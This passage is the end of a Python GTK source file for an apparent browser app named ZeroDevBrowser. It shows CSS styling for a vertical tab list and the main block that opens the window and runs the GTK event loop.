            .vertical-tabs-list row { padding: 4px; border-radius: 6px; margin: 2px 6px; transition: all 0.2s; }
            .vertical-tabs-list row:hover { background: rgba(255,255,255,0.05); }
            .vertical-tabs-list row:selected { background: rgba(77,144,254,0.15); border: 1px solid rgba(77,144,254,0.3); }
        '''
        provider = Gtk.CssProvider(); provider.load_from_data(css)
        Gtk.StyleContext.add_provider_for_screen(Gdk.Screen.get_default(), provider, Gtk.STYLE_PROVIDER_PRIORITY_APPLICATION)

if __name__ == "__main__":
    from gi.repository import Pango
    win = ZeroDevBrowser()
    win.connect("destroy", Gtk.main_quit)
    win.show_all()
    Gtk.main()
